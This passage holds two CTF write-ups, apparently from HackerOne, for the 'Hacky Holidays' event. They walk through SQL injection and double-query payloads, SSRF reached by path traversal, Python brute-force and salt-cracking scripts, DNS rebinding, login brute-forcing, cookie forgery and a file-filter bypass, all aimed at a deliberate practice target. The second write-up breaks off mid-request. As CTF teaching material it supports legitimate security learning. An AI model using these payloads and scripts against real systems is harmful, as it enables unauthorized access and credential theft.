Finally, we got admin access and found the flag.

{F1131253}

>>Flag 10 -: flag{99309f0f-1752-44a5-af1e-a03e4150757d}

**Day 11 - Grinch Recon Server**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/

Initial running dirsearch found the api endpoint https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/
But when we try to make any request to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/* , got the response saying

"This endpoint cannot be visited from this IP address"

I thought it might be accessible by adding some custom headers but nothing worked.

And then looked into photo album,it didn't take long to identify that the  hash parameter is vulnerable to sql injection.
```
Identifying Sql injection

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol'            Response  404

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k--+-     Response 200

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k' order by  4--+-  Reponse 404

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k ' order+by 3--+-   Response 200

Getting vulnerable column

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select 1,2,3--+-     Response 200 and 3rd column is printed
(Please note that we need to remove original hash value to see vulnerbale column)

Trying to extract table name using the query

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select 1,2,table_name+from information_schema.tables where table_schema=database()--+-
```

But it didn't work. After trying to bypass with various ways, something came up with Double Query injcetion.
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1'","2","3"--+-

Putting ' in the first column and something strange happend and fix the query by comment(--+-) and got the normal response back.

>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1'--+-","2","3"--+-
```

Now we can confirm double query injection is possible here. Let's move further.
```
>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' order by 4--+-","2","3"--+-    ERROR

>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' order by 3--+-","2","3"--+-     Normal Reponse

>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' union select \"1\",\"2\",\"3\"--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/3","auth":"fea7507478aa8225c022527b1763fb33"}
```
Upon executing above query, we got the response which vulnerable column is reflecting image request data.
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' union select \"1\",\"2\",database()--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/recon","auth":"015cc4ed326cfc9e314afdaf594a5ce3"}

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' union select \"1\",\"2\",version()--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/8.0.22-0ubuntu0.20.04.3","auth":"03d2bc97a58dc15c4eaf5d4fa2d9f93d"}
```
Combining with path traversal, we can generate valid auth hash for any endpoint which we want to make reuqest.
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/\"--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/","auth":"05a7e708a5f3da76506023047628829d"}
```
Now we can perfrom request to api endpoint /api/* with valid auth hash.
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9
```
One thing is that we need to find valid endpoint to make requests.After guessing multiple endpoints, the following endpoint seems to be valid bocz it response with "Invalid content type detected" .Normally if we make request to invalid endpoint the server responses us with 404.

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/lol\"--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/lol","auth":"494c095363e0f1a99e1c869887522c62"}

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2xvbCIsImF1dGgiOiI0OTRjMDk1MzYzZTBmMWE5OWUxYzg2OTg4NzUyMmM2MiJ9

Expected HTTP status 200, Received: 404

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user\"--+-","2","3"--+-

Invalid content type detected
```

By using the same method, we can guess the  parameters either and found username and password.
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?test=lol\"--+-","2","3"--+-

Expected HTTP status 200, Received: 400 Bad Request

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=lol\"--+-","2","3"--+-

Expected HTTP status 200, Received: 204

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?password=lol\"--+-","2","3"--+-

Expected HTTP status 200, Received: 204
```
So far, we have valid api endpoint and parameters either, now final step is to get valid username and password.

In this case, we can use sql wildcard character (% , _ ) to enumerate username and password.Let's see how it works.

Firstly , let's confrim how many length has username and password.

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=__________%\"--+-","2","3"--+-  ( 10 underscores )

Expected HTTP status 200, Received: 204

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=___________%\"--+-","2","3"--+-  ( 11 underscores )

Invalid content type detected

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=____________%\"--+-","2","3"--+-  ( 12 underscores )

Expected HTTP status 200, Received: 204

OK so username has 10 characters, let's see about passoword

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=__________%\"--+-","2","3"--+-  ( 10 underscores )

Invalid content type detected

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=___________%\"--+-","2","3"--+-  ( 11 underscores )

Expected HTTP status 200, Received: 204
```
Now we're able to identify that username has 11 characters and password has 10 characters.
In order to extract username and password, I made a lazy script to automate these steps.

```
#!/usr/bin/python3
import requests
from urllib.request import urlopen
from bs4 import BeautifulSoup
import string
import numpy as np

alphabet = list(string.ascii_lowercase)
number = list(range(0,10))
fuzz = np.concatenate((alphabet,number))
username = ""
while len(username) < 11:
	for i in fuzz:
		i = username + i
		payload = "lol%20%27%20UNION%20SELECT%20%221%27%20union%20select%20\%221\%22,\%222\%22,\%22../api/user?username={}%\%22--+-%22,%222%22,%223%22--+-".format(i)
		url = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash={}".format(payload)
		req = urlopen(url)
		bs = BeautifulSoup(req.read(), 'html.parser')
		response = bs.find_all('img',class_='img-responsive')
		img_data = response[2]
		sec_req =requests.get("https://hackyholidays.h1ctf.com"+img_data['src'])
		response_txt = sec_req.text
		if "Invalid content type detected" not in response_txt:
			continue
		else:
			username = username + i[-1]
			print("Found valid character: "+i)
			break
else:
	print("Here's the final username: "+username)
```
Run the script and get the valid username : grinchadmin

{F1131246}

For the password, we can either use above script by making a little changes

{F1131246}

Now, simply login into attack-box and find the flag.

>https://hackyholidays.h1ctf.com/attack-box/login

{F1131254}

>>Flag 11 -: flag{07a03135-9778-4dee-a83c-7ec330728e72}

**Day 12 - Grinch Network Attack Server**

As it's saying ,

"We've identified Santa's key servers and loaded them into the attack server ready for you to take down"

We're supposed to "take down the Grinch networks" in order to get the flag and we need to find a way.

Once we try to attack the server, the browser sent the request with uniqe hash for each ip.
```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```
If we try to change the target ip to something else like 127.0.0.1,
```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQo=

Got the response

"Invalid Protection Hash"
```
So we need to find  out how server identifies the valid hash along with target ip.

I stucked there for hours and falied multiple attempts but finally I fingured it out that there's a salt which is being used to generate valid hash for target ip address.Here's the  code how we can find valid salt.
```
#!/usr/bin/python3
import hashlib 
fuzz = [line.rstrip('\n') for line in open('rockyou.txt')]
for i in fuzz:
	#{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
	  target =  i + "203.0.113.33"
	  target_hash = "5f2940d65ca4140cc18d0878bc398955"
	  generate_hash = hashlib.md5(target.encode())
	  md5 = str(generate_hash.hexdigest())
	  if target_hash == md5:
	  	print("Here's valid salt: "+i)
	  	break
```
It will take a while and once we get the salt -: mrgrinch463, we can generate valid hash for every ip address.

Tried to attack local host 127.0.0.1 but it didnt't success due to restriction.

{F1131257}

But it's possible to trick the server by using DNS Rebinding technique, after searching a while , found this [rdnr repo](https://github.com/taviso/rbndr) which we can use to bypass.By checking with host cmmand,

7f000001.c0a80001.rbndr.us  resolves  to 127.0.0.1 and 192.168.0.1 randomly.

Let's see does it work.
```
{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}    >  eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiI2MTQyMmI4MDJhMWQ2ZGRlZDJjZDdhNGNmYTgyYTExMiJ9

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
```
By making above request, once we hit to grinch's local box, we could take down his network completely and got the flag!!!!!

{F1131255}

>Flag 12 -: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}


Thanks for providing awesome ctf, learned a lots.

## Impact

..

---

### [12 Days of CTF Walkthroughs](https://hackerone.com/reports/1068433)

- **Report ID:** `1068433`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** h1-ctf
- **Reporter:** @meraxes
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T21:29:25.428Z
- **CVE(s):** -

**Vulnerability Information:**

# h1-ctf: 12 Days of Hacky Holidays
This is my writeup for 12 Days of Hacky Holidays. The report is written such that beginners to CTFs will be able to learn the tricks of the trade.

## The Mission:
> The Grinch has gone hi-tech this year with the intention of ruining the holidays 😱We need you to infiltrate his network and take him down! Check out all the details on https://hackerone.com/h1-ctf  to learn more!

## Contents
I laid out all the days here with their title and vulnerability. For more information about the vulnerability types, https://portswigger.net/web-security/all-materials is a great resource.

Day | Title | Vulnerability
--- | --- | ---
__1__ | robots.txt | Information Disclosure
__2__ | DOM Flag | Information Disclosure
__3__ | People Rater | Insecure Direct Object Reference (IDOR)
__4__ | Swag Shop | Insecure Direct Object Reference (IDOR)
__5__ | Secure Login | Password Bruteforcing
__6__ | My Diary | Business Logic Vulnerability
__7__ | Hate Mail Generator | Server Side Template Injection (SSTI)
__8__ | Grinch Forum | Open Source Intelligence (OSINT)
__9__ | Evil Quiz | SQL Injection
__10__ | Sign Up Manager | Business Logic Vulnerability
__11__ | Recon Server | SQL Injection / Server Side Request Forgery (SSRF)
__12__ | Attack Box | Hash Cracking / DNS Rebinding
---

# Day 1
Let's jump right in and see what the Grinch is up to:

{F1134432}

Well, that's not very inviting! A usual place to look for URL paths of note is the `robots.txt` file. Accessing it at https://hackyholidays.h1ctf.com/robots.txt returned:

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

Awesome! We have our first flag, `flag{48104912-28b0-494a-9995-a203d1e261e7}`. And if the site is going to "Disallow" robots from accessing `/s3cr3t-ar3a`, then that looks like a great place to check out next.

## Takeaways
- `robots.txt` can sometimes reveal interesting hidden directories

# Day 2
Another day means it is time to make more hot chocolate and capture some more 🚩s.

Let's check out that `/s3cr3t-ar3a` path from yesterday:

{F1134431}

Looking closely at the page HTML in the browser developer tools, there's a suspicious div:

```html
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
```

Alright! We have our flag, `flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`, and path to check out tomorrow, `/apps`. 

## Takeaways
- Sometimes you can find unintended secrets in a webpage's source

# Day 3
Jumping into `/apps` we can see a list view. Looks like we only have one available right now, but that more will appear as the days go on:

{F1134433}

We get a prompt after clicking the button:

> The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!

The people rater is pretty simple:

{F1134434}

Clicking a name triggers a popup with the Grinch's review of that person:

{F1134435}

Rude. Monitoring the network activity with the [Burp Suite](https://portswigger.net/burp) proxy, I could see that pressing the first button sends this request:

**Request:**
```
GET /people-rater/entry?id=eyJpZCI6Mn0=
```

Letters and numbers together ending with an equals sign indicates that the `id` parameter is probably encoded in base64. Using [CyberChef](https://gchq.github.io/CyberChef/) we can decode the ID from base64 to reveal `{"id":2}`. Pretty weird how the first element in the list has an id of 2 isn't it? I wonder what would happen if we manually requested this api with `{"id":1}` encoded in base64?

**Request:**
```
GET /people-rater/entry?id=eyJpZCI6MX0=
```

```js
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

Grinch clearly thinks highly of himself! Let's grab the flag and wait for tomorrow.

## Takeaways
- You can learn how a site API works from intercepting network requests. Then you can interact with the API as you please, even if the UI does not expose the extra functionality.

# Day 4
Looks like the new app of the day from `/apps` is the Swag Shop:
> Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.

{F1134437}

Not sure about you, but I could do with a backup launcher for my snowballs. Let's buy one.

{F1134436}

Hmm, looks like we need to authenticate to buy something. It would be a good idea to explore the API a bit to see what is available.

## Exploring the API
Clicking around the site while proxying through Burp Suite revealed these endpoints:
- `GET /swag-shop/api/stock`
    - Shows the available products in store
- `POST /swag-shop/api/purchase`
    - Attempts to purchase (but returns 401 Unauthorized for us)
- `POST /swag-shop/api/login`
    - Attempts to login

We can fuzz the api with a wordlist from [SecLists](https://github.com/danielmiessler/SecLists) to see if there's anything interesting. The following command shows all requests that return a non 404 response:

```sh
$ ffuf -w common-api-endpoints-mazen160.txt -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -fc 404 -mc all

sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
```

Cool! Let's `GET` the `/swag-shop/api/sessions` endpoint and see the reply:
```js
{
    "sessions": [
        "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
        "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
        "eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
        "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
        // truncated for brevity
    ]
}
```

The content looks like base64. Let's pop this into CyberChef to decode:

```js
[ 
    {
        "user":null, "cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="
    }, {
        "user":null, "cookie":"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="
    }, {
        "user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043", "cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
    }, {
        "user":null, "cookie":"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="
    }
]
```

Now we're cooking. Two things to note here, first, we have cookies, and second, we have a user ID, `C7DCCE-0E0DAB-B20226-FC92EA-1B9043`.

I tried to use the cookies to authenticate on the purchase page, but unfortunately the cookies look to be a bait and don't work.

Let's instead take a closer look at that other endpoint.

**Request:**
```
GET /swag-shop/api/user
```

```js
{
    "error": "Missing required fields"
}
```

Hmm, looks like there's a parameter missing. Time to get fuzzy once more. This command will call the endpoint with every item in the parameter name word list as the query parameter until it finds a result with a non `400 Bad Request` status code:

```sh
$ ffuf -w burp-parameter-names.txt -u https://hackyholidays.h1ctf.com/swag-shop/api/user\?FUZZ\=1 -fc 400 -mc all

uuid                    [Status: 404, Size: 40, Words: 5, Lines: 1]
```

Okay, looks like `uuid` is the parameter that makes a well formed request. We do have an ID from before that we could put in as the value of the `uuid`.

**Request:**
```
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
```
```js
{
    "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
    "username": "grinch",
    "address": {
        "line_1": "The Grinch",
        "line_2": "The Cave",
        "line_3": "Mount Crumpit",
        "line_4": "Whoville"
    },
    "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```

## Takeaways
- You'll frequently encounter content encoded as base64 on the web. Protip: If the string starts with `eyJ` it is probably encoded JSON
- Fuzzing is a technique that can be used to discover additional endpoints and how to use them

# Day 5
Another day means another app! Today's challenge is Secure Login:
> Try and find a way past the login page to get to the secret area.

{F1134442}

I tried putting in `admin/admin` just to see what would happen. 

{F1134440}

This error message is actually poor security practice. Industry standards would return a more generic message like "Invalid Login". By saying specifically, "Invalid Username", the site is allowing us to determine whether or not a username we enter actually exists on the site. 

I wrote a quick script for the Turbo Intruder Burp Suite extension to attempt logging in with all the usernames in a wordlist. It then makes a note if it can find one that returns a page that doesn't contain the text "Invalid Username":

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for word in open('C:/Users/user/dev/SecLists/Usernames/Names/names.txt'):
        engine.queue(target.req, word.strip())


def handleResponse(req, interesting):
    if 'Invalid Username' not in req.response:
        table.add(req)
```

The username `access` returned a page without `Invalid Username` and with an `Invalid Password` message instead. Now that we know a real username, we can attack the password field. This time around, we will look for a page that doesn't respond with "Invalid Password". Turbo Intruder script:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for word in open('C:/Users/user/dev/SecLists/Passwords/Leaked-Databases/rockyou-50.txt'):
        engine.queue(target.req, word.strip())


def handleResponse(req, interesting):
    if 'Invalid Password' not in req.response:
        table.add(req)

```

Ok! `computer` is the password. Full request and response:

**Request:**
```
POST /secure-login HTTP/1.1

username=access&password=computer
```
```
HTTP/1.1 302 Found
Set-Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D; expires=Thu, 17-Dec-2020 01:12:59 GMT; Max-Age=3600; path=/secure-login
```

URL decoded, the cookie we get is `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=`. Let's put this in the browser as the value for a `securelogin` cookie, and see what happens when we refresh.

{F1134441}

We are logged in now! Still, looks like this user isn't able to see very much. The cookie we set was base64 encoded, let's decode it to see if we can find anything interesting.

Decoded, we get `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`. Well, `admin` being `false` doesn't do it for me. Let's make our own cookie with admin rights. 

```js
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}
// Apply base64
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
```

Ok, let's toss our superior cookie into the browser and refresh.

{F1134438}

Obviously we are going to need to see what is in this zip file that isn't for us.

```sh
$ unzip my_secure_files_not_for_you.zip 
Archive:  my_secure_files_not_for_you.zip
[my_secure_files_not_for_you.zip] xxx.png password:
```

Another password! Let's try attacking it with the common passwords wordlist we used before:
```sh
$ fcrackzip -b -D -p rockyou.txt -u my_secure_files_not_for_you.zip

PASSWORD FOUND!!!!: pw == hahahaha
```

Great password. When we type it in we are greeted by two files:

1. **xxx.png**

    {F1134483}

...not sure what to make of that.

2. **flag.txt**
   
    `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`

## Takeaways
- If a login page differentiates between an invalid user and invalid password error message, you can determine whether or not users exist on a site
- Cookies can sometimes be decoded and updated to make a server behave differently
- Password protected zip files can be bruteforced

# Day 6
Let's jump in!
> Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?

{F1134443}

The URL structure (`https://hackyholidays.h1ctf.com/my-diary/?template=entries.html`) looks as though the server is rendering the user specified file. We may be able to find more files to render. Let's get fuzzy:

```sh
$ ffuf -w raft-small-files.txt -u https://hackyholidays.h1ctf.com/my-diary/\?template\=FUZZ -fc 302 -mc all

index.php               [Status: 200, Size: 689, Words: 126, Lines: 22]
.                       [Status: 200, Size: 0, Words: 1, Lines: 1]
_index.php              [Status: 200, Size: 689, Words: 126, Lines: 22]
```
Alrighty, let's access `https://hackyholidays.h1ctf.com/my-diary/?template=index.php` and see what happens:

**Response:**
```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

Awesome, we can see how the pages get rendered. The code gets the name of the file to render as the `template` query parameter. It then strips out any characters that aren't a letter, number, or period. Then it removes occurrences of `admin.php`. Then it removes occurences of `secretadmin.php`. 

We can tell from the comments that `secretadmin.php` is the file we need to access. This will be a bit tricky though considering the text substitutions being made. To make this easier, I copy pasted the critical section of the code into a local editor until I could find a way around this. The key insight is realizing that you can structure your input such that after applying the substitutions you still have the keywords you need. For example, "admin`admin.php`.php" run through the first filter gives you `admin.php` as an output.

With some fiddling, I found this string which works: `secretadmin.phpadminsecretadmin.admin.phpphp.php`. Let's see why this works line by line:

```php
<?php
$page = 'secretadmin.phpadminsecretadmin.admin.phpphp.php';

$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
// $page = 'secretadmin.phpadminsecretadmin.admin.phpphp.php'
$page = str_replace("admin.php","",$page);
// $page = 'secretadminsecretadmin.php.php'
$page = str_replace("secretadmin.php","",$page);
// $page = 'secretadmin.php'
```

Querying `https://hackyholidays.h1ctf.com/my-diary/?template=secretadmin.phpadminsecretadmin.admin.phpphp.php` gives us:
```html
<?php
if( $_SERVER["REMOTE_ADDR"] == '127.0.0.1' ){
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>My Diary</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center">My Diary</h1>
    <h4 class="text-center">flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>
    <div class="row" style="margin-top:30px">
        <div class="col-md-6 col-md-offset-3">
            <div class="panel panel-default">
                <div class="panel-heading">Pending Entries</div>
                <div class="panel-body" style="padding:0">
                    <table class="table" style="margin:0">
                        <tr>
                            <th>Date</th>
                            <th>Event</th>
                            <th class="text-center">Action</th>
                        </tr>
                        <tr>
                            <td>23rd Dec</td>
                            <td>Launch DDoS Against Santa's Workshop!</td>
                            <td class="text-center"><input type="button" class="btn btn-danger btn-xs" value="Post"></td>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
<?php
}else{
    die("You cannot view this page from your IP Address");
}
```

We found the secret diary entry, and the flag! `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`

# Day 7
> Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!

{F1134446}

There's only one campaign available, let's take a look:

{F1134445}

Looks like there is some templating being used to display html fragments and variables. By clicking preview, we can see how it renders:

{F1134448}

By using the "Create New" button, we can write our own template and preview it. 

{F1134447}

We can intercept the request and interact with the API directly.

**Request:**
```
POST /hate-mail-generator/new/preview
preview_markup=Hello+{{name}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
```
```
Hello Alice ....
```

From playing with the request a bit I could gather that the server is parsing `preview_data` as JSON, and then substituting anything in `{{}}` markers in `preview_markup` with the value of the JSON key of the same name. This behavior prevents us from doing a typical template injection with function calls in the `{{}}` markers.

There didn't seem to be any obvious attack here, I decided to fuzz once again.

```sh
$ ffuf -w raft-small-words.txt -u https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ -fc 404 -mc all
templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
```

Hmm, templates, you say? Let's take a look at that.

{F1134450}

Well. We are going to need to take a look at that "admins only" header! Unfortunately, clicking any of these links gives a 403 Forbidden error.

Still, we saw in the example campaign that there is a way to render these files in emails. We can give it a try:

**Request:**
```
POST /hate-mail-generator/new/preview
preview_markup=Hello+{{template:38dhs_admins_only_header.html}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
```
```
You do not have access to the file 38dhs_admins_only_header.html
```

No dice. We could also try sending the template as part of the JSON to be substituted into the markup. This way the content may pass an initial security check while still rendering the content we want.

**Request:**
```
POST /hate-mail-generator/new/preview
